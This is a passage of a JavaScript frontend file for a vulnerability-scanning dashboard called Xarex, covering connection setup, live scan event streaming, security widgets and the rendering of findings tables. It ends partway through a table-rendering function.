/* ══════════════════════════════════════════════════════════════
   Xarex Frontend — app.js
   ══════════════════════════════════════════════════════════════ */

// ── Mobile Sidebar ─────────────────────────────────────────────
function toggleMobileSidebar() {
  const sidebar  = document.getElementById('sidebar');
  const backdrop = document.getElementById('sidebarBackdrop');
  const open = sidebar.classList.toggle('mobile-open');
  backdrop.classList.toggle('open', open);
  document.body.style.overflow = open ? 'hidden' : '';
}

function closeMobileSidebar() {
  document.getElementById('sidebar')?.classList.remove('mobile-open');
  document.getElementById('sidebarBackdrop')?.classList.remove('open');
  document.body.style.overflow = '';
}

// Close mobile sidebar on resize to desktop
window.addEventListener('resize', () => {
  if (window.innerWidth > 768) closeMobileSidebar();
});

// ── Custom Confirm Dialog ─────────────────────────────────────
let _confirmResolve = null;

function showConfirm({ title, subtitle='', message, okLabel='Confirm', okColor='#f04f59', icon='⚠', iconBg='rgba(240,79,89,0.15)' }) {
  return new Promise(resolve => {
    _confirmResolve = resolve;
    const overlay = document.getElementById('confirmOverlay');
    if (!overlay) { resolve(window.confirm(message)); return; }
    document.getElementById('confirmTitle').textContent    = title;
    document.getElementById('confirmSubtitle').textContent = subtitle;
    document.getElementById('confirmMessage').innerHTML    = message;
    const iconEl = document.getElementById('confirmIcon');
    iconEl.textContent      = icon;
    iconEl.style.background = iconBg;
    const okBtn = document.getElementById('confirmOkBtn');
    okBtn.textContent        = okLabel;
    okBtn.style.background   = okColor;
    okBtn.style.color        = '#fff';
    okBtn.style.borderRadius = '8px';
    okBtn.onclick            = () => confirmResolveWith(true);
    overlay.classList.add('open');
  });
}

function confirmDismiss()        { confirmResolveWith(false); }
function confirmResolveWith(val) {
  const overlay = document.getElementById('confirmOverlay');
  if (overlay) overlay.classList.remove('open');
  if (_confirmResolve) { _confirmResolve(val); _confirmResolve = null; }
}

// Close on overlay background click
document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('confirmOverlay')?.addEventListener('click', e => {
    if (e.target === e.currentTarget) confirmDismiss();
  });
});

// Production Cloud Brain endpoint shown in deploy instructions, download
// links, and every other user-facing URL on the Deploy Probe page.
// STATE.brainUrl is the *actual* API endpoint the dashboard talks to (may be
// http://localhost:8005 in dev); PRODUCTION_URL is what we tell customers to
// point their probes at.
const PRODUCTION_URL  = 'https://xarex.com';
const PRODUCTION_GRPC = 'xarex.com:50051';

const STATE = {
  apiKey:    localStorage.getItem('xarex_api_key')    || '',
  brainUrl: (localStorage.getItem('xarex_brain_url') || 'http://localhost:8005').replace(/\/$/, ''),
  orgId:     localStorage.getItem('xarex_org_id')     || '',
  orgName:   localStorage.getItem('xarex_org_name')   || '',
  connected: false,
  ws:        null,
  activeScanId: null,
  scans:    [],
  findings: [],
  probes:   [],
};

// Fetch the caller's own org details (id + name) after auth so the deploy
// page can show the real org_id, not a placeholder. Cached in localStorage
// so the dashboard doesn't need a round-trip on every reload.
async function loadOrgIdentity() {
  if (!STATE.apiKey) return;
  try {
    const me = await api('/api/v1/me');
    STATE.orgId   = me.id;
    STATE.orgName = me.name;
    localStorage.setItem('xarex_org_id',   me.id);
    localStorage.setItem('xarex_org_name', me.name);
  } catch (e) {
    console.warn('loadOrgIdentity failed:', e.message);
  }
}

// ── API helper ────────────────────────────────────────────────

async function api(path, options = {}) {
  const url = `${STATE.brainUrl}${path}`;
  const headers = { 'Content-Type': 'application/json', 'X-API-Key': STATE.apiKey };
  try {
    const res = await fetch(url, { headers, ...options });
    if (!res.ok) {
      const err = await res.json().catch(() => ({ detail: res.statusText }));
      throw new Error(err.detail || res.statusText);
    }
    return res.json();
  } catch (e) {
    console.error(`API ${path}:`, e.message);
    throw e;
  }
}

// ── Connection state ──────────────────────────────────────────

function setConnected(v) {
  STATE.connected = v;

  // Sidebar connection dot
  const dot   = document.getElementById('connDot');
  const label = document.getElementById('connLabel');
  if (dot)   dot.className   = 'conn-dot ' + (v ? 'online' : 'offline');
  if (label) label.textContent = v ? 'Connected' : 'Disconnected';

  // Topbar status pill
  const tDot  = document.getElementById('topbarDot');
  const tText = document.getElementById('topbarText');
  if (tDot)  tDot.className   = 'ts-dot ' + (v ? 'online' : 'offline');
  if (tText) tText.textContent = v ? 'Connected' : 'Disconnected';

  // Settings page status
  const sc  = document.getElementById('settingsConnStatus');
  const sbu = document.getElementById('settingsBrainUrlDisplay');
  if (sc)  sc.textContent  = v ? '✓ Online' : '✗ Offline';
  if (sc)  sc.style.color  = v ? 'var(--success)' : 'var(--critical)';
  if (sbu) sbu.textContent = STATE.brainUrl;
}

// ── Landing page flow ─────────────────────────────────────────

function showLandingPage() {
  const lp    = document.getElementById('landingPage');
  const shell = document.getElementById('appShell');
  const setup = document.getElementById('setupOverlay');
  if (shell) shell.style.display = 'none';
  if (setup) setup.style.display = 'none';
  if (lp) {
    lp.style.display = '';
    lp.style.opacity = '';
    // Boot Three.js / GSAP / tilt etc. — idempotent, returns true on first
    // init and false on re-show (e.g. after sign-out).
    const wasFirstInit = window.__xarexBootLp ? window.__xarexBootLp() : true;
    const reduceMotion = window.matchMedia
      && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    requestAnimationFrame(() => {
      if (typeof ScrollTrigger !== 'undefined') ScrollTrigger.refresh();
      // On re-show only, rerun the hero fade-in (GSAP's initial gsap.from
      // already ran during the first init and elements are at their final
      // state). On first init, initGSAP's gsap.from handles the entrance.
      // Skip entirely under prefers-reduced-motion.
      if (!wasFirstInit && !reduceMotion && typeof gsap !== 'undefined') {
        gsap.fromTo('.lp-fade-up',
          { opacity: 0, y: 40 },
          { opacity: 1, y: 0, duration: 0.9, stagger: 0.1, ease: 'power3.out', delay: 0.1, clearProps: 'all', overwrite: 'auto' }
        );
      }
    });
  }
}

function hideLandingPage() {
  const lp = document.getElementById('landingPage');
  if (lp) lp.style.display = 'none';
}

function showConnectModal() {
  const modal = document.getElementById('connectModal');
  if (!modal) return;
  document.getElementById('connectUrl').value = STATE.brainUrl || 'http://localhost:8005';
  document.getElementById('connectKey').value = '';
  document.getElementById('connectError').style.display = 'none';
  modal.style.display = 'flex';
}

function hideConnectModal() {
  const modal = document.getElementById('connectModal');
  if (modal) modal.style.display = 'none';
}

async function connectFromModal() {
  const urlEl = document.getElementById('connectUrl');
  const keyEl = document.getElementById('connectKey');
  const errEl = document.getElementById('connectError');
  const btn   = document.getElementById('connectBtn');

  const url = (urlEl.value.trim().replace(/\/$/, '')) || 'http://localhost:8005';
  const key = keyEl.value.trim();

  if (!key) {
    errEl.textContent = 'Please enter your API key.';
    errEl.style.display = '';
    return;
  }

  btn.disabled = true;
  btn.textContent = 'Connecting…';
  errEl.style.display = 'none';

  STATE.brainUrl = url;
  STATE.apiKey   = key;

  try {
    await api('/health');
    localStorage.setItem('xarex_api_key',   key);
    localStorage.setItem('xarex_brain_url', url);
    hideConnectModal();
    hideLandingPage();
    launchApp();
  } catch (e) {
    errEl.textContent = `Cannot reach ${url} — ${e.message}`;
    errEl.style.display = '';
    btn.disabled = false;
    btn.textContent = 'Connect to Xarex';
  }
}

function signOut() {
  // Clear stored credentials
  localStorage.removeItem('xarex_api_key');
  localStorage.removeItem('xarex_brain_url');
  STATE.apiKey   = '';
  STATE.connected = false;
  if (STATE.ws) { STATE.ws.close(); STATE.ws = null; }

  // Hide app shell + AI widget
  const shell = document.getElementById('appShell');
  const aiW   = document.getElementById('aiAssistantWidget');
  if (shell) shell.style.display = 'none';
  if (aiW)   aiW.style.display = 'none';

  // Show landing page
  showLandingPage();
}

// Landing page initialization (scroll-reveal, FAQ accordion, ROI calc, sticky
// nav) is owned end-to-end by the inline <script> inside #landingPage in
// index.html. The previous duplicate implementation here caused:
//   - FAQ clicks to fire two handlers and cancel each other
//   - .visible class toggling on .lp-reveal that nothing in CSS responds to
//   - dead ROI bindings against #lpPentestSlider etc. (those IDs no longer exist)
//   - duplicate sticky-nav scroll listeners writing inline style + class
// Boot is now triggered via window.__xarexBootLp() from showLandingPage().

// ── Setup flow ────────────────────────────────────────────────

async function setupConnect() {
  const urlEl = document.getElementById('setupUrl');
  const keyEl = document.getElementById('setupKey');
  const errEl = document.getElementById('setupError');
  const btn   = document.getElementById('setupConnectBtn');

  const url = urlEl.value.trim().replace(/\/$/, '') || STATE.brainUrl;
  const key = keyEl.value.trim();

  if (!key) { showSetupError('Please enter your API key.'); return; }

  btn.disabled = true;
  btn.textContent = 'Connecting…';
  errEl.style.display = 'none';

  STATE.brainUrl = url;
  STATE.apiKey   = key;

  try {
    await api('/health');
    localStorage.setItem('xarex_api_key',    key);
    localStorage.setItem('xarex_brain_url',  url);
    launchApp();
  } catch (e) {
    showSetupError(`Cannot reach ${url} — ${e.message}`);
    btn.disabled = false;
    btn.textContent = 'Connect to Xarex';
  }
}

function showSetupError(msg) {
  const el = document.getElementById('setupError');
  el.textContent = msg;
  el.style.display = '';
}

function launchApp() {
  // Hide all gating screens
  const setupOverlay  = document.getElementById('setupOverlay');
  const connectModal  = document.getElementById('connectModal');
  const landingPage   = document.getElementById('landingPage');
  if (setupOverlay) setupOverlay.style.display = 'none';
  if (connectModal) connectModal.style.display = 'none';
  if (landingPage)  landingPage.style.display  = 'none';

  // Show app shell
  document.getElementById('appShell').style.display = 'flex';

  // Show AI assistant widget
  const aiWidget = document.getElementById('aiAssistantWidget');
  if (aiWidget) aiWidget.style.display = '';

  // Sync settings fields
  const sbu = document.getElementById('settingsBrainUrl');
  const sak = document.getElementById('settingsApiKey');
  if (sbu) sbu.value = STATE.brainUrl;
  if (sak) sak.value = STATE.apiKey;

  setConnected(true);
  // Activate dashboard section on load
  _activateSectionNav('dashboard');
  loadAll();
}

async function connect() {
  try {
    await api('/health');
    setConnected(true);
    loadAll();
  } catch (e) {
    setConnected(false);
    addOpsEvent({ sev: 'error', title: `Cannot reach Cloud Brain: ${e.message}` });
  }
}

// ── WebSocket ─────────────────────────────────────────────────

function connectWS(scanId) {
  if (STATE.ws) { STATE.ws.close(); STATE.ws = null; }

  const scan = STATE.scans.find(s => s.id === scanId);
  const scanName = scan?.name || `Scan ${scanId.slice(0,8)}`;

  // For completed/failed/cancelled scans, show summary instead of live feed
  if (scan && ['completed', 'failed', 'cancelled'].includes(scan.status)) {
    showLiveScan(scanId, scanName);
    LIVE.done = true;
    _setStopBtn(false);
    _setScanDone(true);
    LIVE.total = scan.finding_count || 0;
    updateLiveMetrics();
    logToTerminal('ok', `Scan "${scanName}" already ${scan.status} — ${scan.finding_count || 0} findings recorded.`);
    logToTerminal('dim', 'Connect via WebSocket to replay events, or start a new scan for live updates.');
    renderPhaseTrack(PHASES.length);
    // Fetch existing report and show download buttons
    if (scan.status === 'completed') {
      api('/api/v1/reports').then(reports => {
        let r = reports.find(r => r.scan_id === scanId);
        if (r) _showReportButtons(r.id);
        else api(`/api/v1/reports/scans/${scanId}`, { method: 'POST' })
              .then(rep => _showReportButtons(rep.id)).catch(() => {});
      }).catch(() => {});
    }
    return;
  }

  const wsUrl = STATE.brainUrl.replace(/^http/, 'ws');
  const ws = new WebSocket(`${wsUrl}/api/v1/scans/${scanId}/stream?api_key=${STATE.apiKey}`);

  ws.onopen = () => {
    addOpsEvent({ sev: 'info', checkType: 'STREAM', title: `Connected — ${scanName}` });
    document.getElementById('opsLiveDot')?.classList.add('active');
    // Panel may already be open if launched from new scan — just log
    if (LIVE.scanId !== scanId) showLiveScan(scanId, scanName);
    else logToTerminal('probe', 'Live stream connected.');
  };
  ws.onmessage = (e) => { try { handleScanEvent(JSON.parse(e.data)); } catch {} };
  ws.onclose   = () => {
    addOpsEvent({ sev: 'info', checkType: 'STREAM', title: 'Disconnected' });
    document.getElementById('opsLiveDot')?.classList.remove('active');
    logToTerminal('dim', 'WebSocket stream closed.');
  };
  STATE.ws = ws;
  STATE.activeScanId = scanId;
  const badge = document.getElementById('liveEventsScanBadge');
  if (badge) { badge.textContent = scanId.slice(0,8); badge.style.display = ''; }
}

function handleScanEvent(evt) {
  const evtType = evt.type || evt.event || '';
  if (evtType === 'keepalive' || evtType === 'pong') return;

  // Parse payload
  let payload = {};
  try {
    if (typeof evt.payload_json === 'string') payload = JSON.parse(evt.payload_json);
    else if (typeof evt.payload_json === 'object' && evt.payload_json) payload = evt.payload_json;
  } catch {}
  // ── Ops Console event ────────────────────────────────────────
  const _sevFromInt = [,'low','low','medium','high','critical'];
  if (evtType === 'FINDING_DISCOVERED' || evtType === 'finding_discovered') {
    const f = evt.finding || payload;
    const sevInt = f.severity ?? 0;
    addOpsEvent({
      sev:         _sevFromInt[sevInt] || 'info',
      host:        f.host || '',
      port:        f.port || null,
      checkType:   f.check_type || evt.task_type || '',
      title:       f.title || f.service || 'Finding',
      desc:        f.description || '',
      remediation: f.remediation || '',
    });
  } else if (evtType === 'TASK_COMPLETED' || evtType === 'task_completed') {
    const tt    = evt.task_type || payload.task_type || '';
    const ok    = evt.success !== false;
    const count = evt.finding_count ?? 0;
    const msg   = evt.message || payload.message || '';
    const title = !ok
      ? `✗ failed`
      : msg || `✓ ${count} finding${count !== 1 ? 's' : ''}`;
    addOpsEvent({ sev: ok ? 'task' : 'error', checkType: tt, title });
  } else if (evtType === 'TASK_STARTED' || evtType === 'task_started') {
    const tt     = evt.task_type || payload.task_type || '';
    const target = evt.target    || payload.target    || '';
    if (tt === 'HOST_DISCOVERY') {
      const isSubnet = target.includes('/') && !target.endsWith('/32');
      if (isSubnet) {
        const bits   = parseInt(target.split('/')[1], 10);
        const count  = Math.min(Math.pow(2, 32 - bits) - 2, 65534);
        logToTerminal('task', `Sweeping ${target} — ${count.toLocaleString()} addresses, may take 15–60s`);
      } else {
        logToTerminal('task', `Probing ${target || 'target'}…`);
      }
    }
    addOpsEvent({ sev: 'info', checkType: tt, title: `in progress${target ? ' — ' + target : ''}` });
    // Activate this phase on the tracker immediately (don't wait for completion)
    const phaseMap2 = { HOST_DISCOVERY:'HOST_DISCOVERY', PORT_SCAN:'PORT_SCAN', VULN_SCAN:'VULN_SCAN' };
    if (phaseMap2[tt]) advancePhase(phaseMap2[tt]);
  } else if (evtType === 'PROBE_CONNECTED' || evtType === 'probe_connected') {
    const pid = payload.probe_id || evt.probe_id || 'probe';
    addOpsEvent({ sev: 'info', checkType: 'PROBE', title: `${pid} connected` });
  } else if (evtType === 'SCAN_COMPLETED' || evtType === 'scan_completed') {
    addOpsEvent({ sev: 'task', checkType: 'SCAN', title: `Scan complete — ${LIVE.total} findings` });
  } else if (evtType === 'ATTACK_PATH_BUILT' || evtType === 'attack_path_built') {
    addOpsEvent({ sev: 'info', checkType: 'ATTACK-PATH', title: 'Attack path graph built' });
  } else if (evtType === 'ERROR') {
    const msg = payload.message || evt.message || JSON.stringify(evt).slice(0, 100);
    addOpsEvent({ sev: 'error', title: msg });
  }

  // Live terminal — only log high-value events, not every finding (too noisy)
  if (evtType === 'SCAN_COMPLETED' || evtType === 'scan_completed') {
    logToTerminal('ok', `Scan complete — ${LIVE.total} total findings`);
  } else if (evtType === 'ERROR') {
    logToTerminal('finding', `Error: ${payload.message || evt.message || ''}`);
  } else if (evtType === 'PROBE_CONNECTED' || evtType === 'probe_connected') {
    logToTerminal('probe', `Probe ${payload.probe_id || evt.probe_id || ''} online`);
  }

  // Phase tracking
  const phaseMap = {
    HOST_DISCOVERY:    'HOST_DISCOVERY',
    PORT_SCAN:         'PORT_SCAN',
    SERVICE_DETECTION: 'SERVICE_DETECTION',
    VULN_SCAN:         'VULN_SCAN',
    ATTACK_PATH_BUILT: 'ATTACK_PATH',
    REPORT_GENERATION: 'REPORT',
  };
  if (phaseMap[evtType]) advancePhase(phaseMap[evtType]);

  // Advance phase bar when a task completes
  if (evtType === 'TASK_COMPLETED' || evtType === 'task_completed') {
    const tt = evt.task_type || payload.task_type || '';
    if (phaseMap[tt]) advancePhase(phaseMap[tt]);
  }

  // Live metric updates
  if (evtType === 'FINDING_DISCOVERED' || evtType === 'finding_discovered') {
    // finding data lives in evt.finding, not payload_json
    const f = evt.finding || payload;
    LIVE.total++;
    const sev = f.severity;
    if (sev === 4) LIVE.crit++;
    if (sev === 3) LIVE.high++;
    if (f.host) {
      if (!LIVE._hostSet) LIVE._hostSet = new Set();
      LIVE._hostSet.add(f.host);
      LIVE.hosts = LIVE._hostSet.size;
    }
    if (f.port) {
      if (!LIVE._portSet) LIVE._portSet = new Set();
      LIVE._portSet.add(f.port);
      LIVE.ports = LIVE._portSet.size;
    }
    if (f.service) {
      if (!LIVE._serviceSet) LIVE._serviceSet = new Set();
      LIVE._serviceSet.add(f.service);
      LIVE.services = LIVE._serviceSet.size;
    }
    updateLiveMetrics();
    loadFindings(); loadDashboardStats();
  }

  if (evtType === 'SCAN_COMPLETED' || evtType === 'scan_completed') {
    logToTerminal('ok', `Scan completed! ${LIVE.total} findings discovered.`);
    renderPhaseTrack(PHASES.length);
    LIVE.done = true;
    _setStopBtn(false);
    _setScanDone(true);
    loadScans(); loadDashboardStats();
    const completedScanId = LIVE.scanId;
    if (completedScanId) {
      setTimeout(async () => {
        try {
          const report = await api(`/api/v1/reports/scans/${completedScanId}`, { method: 'POST' });
          _showReportButtons(report.id);
          logToTerminal('ok', `Report ready — click <strong>Open Report</strong> or <strong>Download PDF</strong> above.`);
          loadReports();
        } catch(e) {
          logToTerminal('warn', `Report auto-generation: ${e.message}`);
        }
      }, 2000);
    }
  }

  if (evtType === 'SCAN_STOPPED' || evtType === 'scan_stopped') {
    logToTerminal('warn', 'Scan stopped by user.');
    LIVE.done = true;
    _setStopBtn(false);
    _setScanDone(true);
    loadScans(); loadDashboardStats();
  }

  if (evtType === 'PROBE_CONNECTED' || evtType === 'probe_connected') {
    logToTerminal('probe', `Probe ${payload.probe_id || evt.probe_id || 'connected'} — scan ${LIVE.scanId?.slice(0,8)}`);
  }

  if (evtType === 'ERROR') {
    logToTerminal('finding', `Error: ${msg}`);
  }
}

// ── Load all ──────────────────────────────────────────────────

// Single parallel fetch for everything — avoids duplicate requests.
async function loadAll() {
  try {
    // Fire identity load alongside the bulk fetch so the Deploy Probe page
    // has a real org_id available before the user navigates there.
    loadOrgIdentity();

    const [scans, probes, stats, findings, schedules] = await Promise.all([
      api('/api/v1/scans').catch(() => []),
      api('/api/v1/probes').catch(() => []),
      api('/api/v1/findings/stats').catch(() => null),
      api('/api/v1/findings').catch(() => []),
      api('/api/v1/schedules').catch(() => []),
    ]);

    // Sort scans newest-first before caching
    scans.sort((a, b) => new Date(b.created_at || b.started_at || 0) - new Date(a.created_at || a.started_at || 0));
    STATE.scans   = scans;
    STATE.probes  = probes;

    // Dashboard stats
    setText('statScans', scans.length);
    const onlineCount = probes.filter(p => p.status === 'online').length;
    setText('statProbes', onlineCount);
    const banner = document.getElementById('probeBanner');
    if (banner) banner.style.display = onlineCount === 0 ? 'flex' : 'none';
    const pb = document.getElementById('navProbeCount');
    if (pb) { pb.textContent = onlineCount; pb.style.display = onlineCount > 0 ? '' : 'none'; }

    if (stats) {
      const crit = stats.by_severity?.Critical ?? 0;
      setText('statCritical',      crit);
      setText('statHigh',          stats.by_severity?.High ?? 0);
      setText('statHighRiskHosts', stats.high_risk_hosts ?? 0);
      const nb = document.getElementById('navCritCount');
      if (nb) { nb.textContent = crit; nb.style.display = crit > 0 ? '' : 'none'; }
      drawSeverityChartFromStats(stats.by_severity || {});
    }
    setText('statSchedules', schedules.filter(s => s.enabled).length);

    renderRecentScans(scans.slice(0, 5));
    populateScanFilter(scans);
    populateAIScanFilter(scans);
    drawRiskTrend();
    updateBreachProbability();

    // Render pages that are pre-loaded with the fetched data
    renderScansTable(scans);
    renderFindingsTable(findings);
    renderProbesTable(probes);
    populateProbeSelect(probes);
    updateDeployCmd?.();
    const el = document.getElementById('findingsCount');
    if (el) el.textContent = findings.length;

  } catch(e) { console.warn('loadAll error:', e); }
}

async function loadDashboardStats() {
  // Lightweight refresh — only stats (no scans/probes re-fetch when already cached)
  try {
    const stats = await api('/api/v1/findings/stats').catch(() => null);
    if (stats) {
      const crit = stats.by_severity?.Critical ?? 0;
      setText('statCritical',      crit);
      setText('statHigh',          stats.by_severity?.High ?? 0);
      setText('statHighRiskHosts', stats.high_risk_hosts ?? 0);
      const nb = document.getElementById('navCritCount');
      if (nb) { nb.textContent = crit; nb.style.display = crit > 0 ? '' : 'none'; }
      drawSeverityChartFromStats(stats.by_severity || {});
    }
    setText('statScans', STATE.scans.length);
    const onlineCount = (STATE.probes || []).filter(p => p.status === 'online').length;
    setText('statProbes', onlineCount);
  } catch(e) { console.warn('Dashboard stats error:', e); }

  // Load personal security widgets in parallel (non-blocking)
  loadPsecWidgets().catch(() => {});
}

// ── Personal Security Widgets ─────────────────────────────────────────────────
async function loadPsecWidgets() {
  await Promise.allSettled([
    _loadScoreWidget(),
    _loadBreachWidget(),
    _loadDomainWidget(),
    _loadNotifWidget(),
  ]);
}

async function _loadScoreWidget() {
  try {
    const data = await api('/api/v1/security-score');
    const score  = data.score  ?? 0;
    const grade  = data.grade  ?? '?';
    const colour = score >= 80 ? '#3dd68c' : score >= 60 ? '#7c6af7' : score >= 40 ? '#f0853a' : '#f04f59';

    setText('dashScoreVal', `${score}`);
    const valEl = document.getElementById('dashScoreVal');
    if (valEl) valEl.style.color = colour;

    setText('dashScoreSub', `Grade ${grade} · ${score >= 80 ? 'Good posture' : score >= 60 ? 'Needs attention' : 'Action required'}`);

    // Animate SVG ring  (circumference = 2π×18 ≈ 113.1)
    const ring = document.getElementById('dashScoreRing');
    if (ring) {
      const offset = 113.1 - (score / 100) * 113.1;
      ring.style.stroke = colour;
      ring.setAttribute('stroke-dashoffset', offset.toFixed(1));
    }

    const widget = document.getElementById('psecScoreWidget');
    if (widget) widget.className = `psec-widget glass-card status-${score >= 80 ? 'good' : score >= 50 ? 'warn' : 'critical'}`;
  } catch(_) {
    setText('dashScoreSub', 'Not computed yet');
  }
}

async function _loadBreachWidget() {
  try {
    const data = await api('/api/v1/breach-monitor/summary');
    const total   = data.total_breaches   ?? 0;
    const monitored = data.total_monitored ?? 0;

    const colour = total > 0 ? '#f04f59' : '#3dd68c';
    setText('dashBreachVal', total > 0 ? `${total}` : '✓ Clean');
    const valEl = document.getElementById('dashBreachVal');
    if (valEl) valEl.style.color = colour;

    setText('dashBreachSub', `${monitored} email${monitored !== 1 ? 's' : ''} monitored`);

    const widget = document.getElementById('psecBreachWidget');
    if (widget) widget.className = `psec-widget glass-card status-${total > 0 ? 'critical' : 'good'}`;
  } catch(_) {
    setText('dashBreachSub', 'Add emails to monitor');
  }
}

async function _loadDomainWidget() {
  try {
    const domains = await api('/api/v1/domain-guardian');
    const critical = domains.filter(d => d.status === 'critical').length;
    const warning  = domains.filter(d => d.status === 'warning').length;
    const total    = domains.length;

    if (!total) {
      setText('dashDomainVal', '—');
      setText('dashDomainSub', 'No domains monitored');
      return;
    }

    const colour = critical > 0 ? '#f04f59' : warning > 0 ? '#f0853a' : '#3dd68c';
    setText('dashDomainVal', critical + warning > 0 ? `${critical + warning} issues` : '✓ Healthy');
    const valEl = document.getElementById('dashDomainVal');
    if (valEl) valEl.style.color = colour;

    setText('dashDomainSub', `${total} domain${total !== 1 ? 's' : ''} monitored`);

    const widget = document.getElementById('psecDomainWidget');
    if (widget) widget.className = `psec-widget glass-card status-${critical > 0 ? 'critical' : warning > 0 ? 'warn' : 'good'}`;
  } catch(_) {
    setText('dashDomainSub', 'Add domains to monitor');
  }
}

async function _loadNotifWidget() {
  try {
    const data  = await api('/api/v1/notifications/unread-count');
    const count = data.count ?? 0;

    const colour = count > 0 ? '#f0853a' : '#3dd68c';
    setText('dashNotifVal', count > 0 ? `${count} unread` : '✓ All read');
    const valEl = document.getElementById('dashNotifVal');
    if (valEl) valEl.style.color = colour;

    // Latest notification as subtitle
    const items = await api('/api/v1/notifications?limit=1');
    const sub   = items.length
      ? items[0].title.slice(0, 50) + (items[0].title.length > 50 ? '…' : '')
      : 'No alerts yet';
    setText('dashNotifSub', sub);

    const widget = document.getElementById('psecNotifWidget');
    if (widget) widget.className = `psec-widget glass-card status-${count > 0 ? 'warn' : 'good'}`;
  } catch(_) {
    setText('dashNotifSub', 'No alerts yet');
  }
}

async function loadScans() {
  try {
    const scans = await api('/api/v1/scans');
    scans.sort((a, b) => new Date(b.created_at || b.started_at || 0) - new Date(a.created_at || a.started_at || 0));
    STATE.scans = scans;
    renderScansTable(scans);
    populateScanFilter(scans);
    populateAIScanFilter(scans);
  } catch(e) { console.warn('loadScans error:', e); }
}

async function loadFindings(scanId, severity, host) {
  try {
    const params = new URLSearchParams();
    if (scanId)   params.set('scan_id',  scanId);
    if (severity !== undefined && severity !== '') params.set('severity', severity);
    if (host)     params.set('host', host);
    params.set('limit', '500');

    const findings = await api(`/api/v1/findings?${params}`);
    STATE.findings = findings;
    renderFindingsTable(findings);

    const hostParams = new URLSearchParams();
    if (scanId) hostParams.set('scan_id', scanId);
    const hostRisk = await api(`/api/v1/findings/host-risk?${hostParams}`).catch(() => []);
    renderHostRiskTable(hostRisk);

    const el = document.getElementById('findingsCount');
    if (el) el.textContent = findings.length;
  } catch(e) { console.warn('Findings load error:', e); }
}

async function loadProbes() {
  try {
    const probes = await api('/api/v1/probes');
    STATE.probes = probes;
    renderProbesTable(probes);
    populateProbeSelect(probes);
    updateDeployCmd();
  } catch {}
}

async function loadReports() {
  try {
    const reports = await api('/api/v1/reports');
    renderReportsTable(reports);
  } catch {}
}

async function loadSchedules() {
  try {
    const schedules = await api('/api/v1/schedules');
    renderSchedulesTable(schedules);
  } catch {}
}

// ── Render functions ──────────────────────────────────────────

function renderRecentScans(scans) {
  const body = document.getElementById('recentScansBody');
  if (!scans.length) { body.innerHTML = '<tr><td colspan="4" class="empty">No scans yet — click Quick Scan above</td></tr>'; return; }
  body.innerHTML = scans.map(s => `
    <tr>
      <td style="font-weight:600">${esc(s.name)}</td>
      <td><span class="status status-${s.status}">${s.status}</span></td>
      <td style="color:var(--text-2)">${fmtDate(s.started_at)}</td>
      <td>${s.finding_count ?? '—'}</td>
    </tr>`).join('');
}

function renderScansTable(scans) {
  const body = document.getElementById('scansBody');
  if (!scans.length) { body.innerHTML = '<tr><td colspan="6" class="empty">No scans yet</td></tr>'; return; }
  body.innerHTML = [...scans].reverse().map(s => `
    <tr>
      <td style="font-weight:600">${esc(s.name)}</td>
      <td><span class="status status-${s.status}">${s.status}</span></td>
      <td style="color:var(--text-2);font-size:13px">${esc(s.probe_id || '—')}</td>
      <td style="color:var(--text-2)">${fmtDate(s.started_at)}</td>
      <td>${s.finding_count ?? '—'}</td>
      <td>
        <button class="btn btn-ghost btn-sm" onclick="viewScan('${s.id}')">View Paths</button>
        <button class="btn btn-ghost btn-sm" onclick="navigateTo('dashboard');setTimeout(()=>connectWS('${s.id}'),150)">Watch Live</button>
      </td>
    </tr>`).join('');
}

const RSTAT_LABELS = {
  new:              { label: 'New',            cls: 'rstat-new' },
  in_progress:      { label: 'In Progress',    cls: 'rstat-in-progress' },
  fixed:            { label: 'Fixed',          cls: 'rstat-fixed' },
  false_positive:   { label: 'False Positive', cls: 'rstat-fp' },
  accepted_risk:    { label: 'Accepted Risk',  cls: 'rstat-accepted' },
};

function remediationBadge(status) {
  const s = RSTAT_LABELS[status] || RSTAT_LABELS.new;
  return `<span class="rstat-badge ${s.cls}">${s.label}</span>`;
}

function renderFindingsTable(findings) {
  const body = document.getElementById('findingsBody');
  if (!findings.length) { body.innerHTML = '<tr><td colspan="9" class="empty">No findings</td></tr>'; return; }
  body.innerHTML = findings.map(f => {
    const techniques = (f.attack_techniques || []).slice(0, 2).join(', ');
    const cvss = f.cvss_score ? `<span class="cvss-score cvss-${cvssColor(f.cvss_score)}">${f.cvss_score}</span>` : '—';
    const rs = f.remediation_status || 'new';
    return `<tr>
      <td><span class="sev sev-${f.severity}">${sevLabel(f.severity)}</span></td>
      <td><code style="font-size:12px">${esc(f.host)}</code></td>
      <td style="color:var(--text-2)">${f.port || '—'}</td>
      <td style="font-weight:500">${esc(f.title)}</td>
      <td>${f.cve_id ? `<a href="https://nvd.nist.gov/vuln/detail/${esc(f.cve_id)}" target="_blank" class="cve-link"><code style="font-size:12px">${esc(f.cve_id)}</code></a>` : '—'}</td>
      <td>${cvss}</td>
      <td>${techniques ? `<span class="technique-badge">${esc(techniques)}</span>` : '—'}</td>
      <td>
        <select class="rstat-select rstat-select-${rs}" onchange="setRemediationStatus('${f.id}', this.value, this)" title="Remediation Status">
          <option value="new"            ${rs==='new'?'selected':''}>New</option>
          <option value="in_progress"    ${rs==='in_progress'?'selected':''}>In Progress</option>
          <option value="fixed"          ${rs==='fixed'?'selected':''}>Fixed</option>
          <option value="false_positive" ${rs==='false_positive'?'selected':''}>False +</option>
          <option value="accepted_risk"  ${rs==='accepted_risk'?'selected':''}>Accepted</option>
        </select>
      </td>
      <td>
        <button class="btn btn-ghost btn-sm" onclick='showFinding(${JSON.stringify(f)})'>Detail</button>
        ${f.cve_id ? `<button class="btn btn-ghost btn-sm" onclick="enrichCVE('${f.id}','${f.cve_id}')">Enrich</button>` : ''}
      </td>
    </tr>`;
  }).join('');
}

async function setRemediationStatus(findingId, newStatus, selectEl) {
  try {
    await api(`/api/v1/findings/${findingId}/status`, {
      method: 'PATCH',
      body: JSON.stringify({ status: newStatus }),
    });
    // Update select colour class
    if (selectEl) {
      selectEl.className = `rstat-select rstat-select-${newStatus}`;
    }
    addEvent('task', `Finding status → ${newStatus.replace('_', ' ')}`);
  } catch(e) {
    showError(`Status update failed: ${e.message}`);
    if (selectEl) loadFindings(); // reload to restore correct state
  }
}

function renderHostRiskTable(hosts) {
  const body = document.getElementById('hostRiskBody');
  if (!hosts || !hosts.length) { body.innerHTML = '<tr><td colspan="7" class="empty">No host data</td></tr>'; return; }
  body.innerHTML = hosts.map(h => `
    <tr>
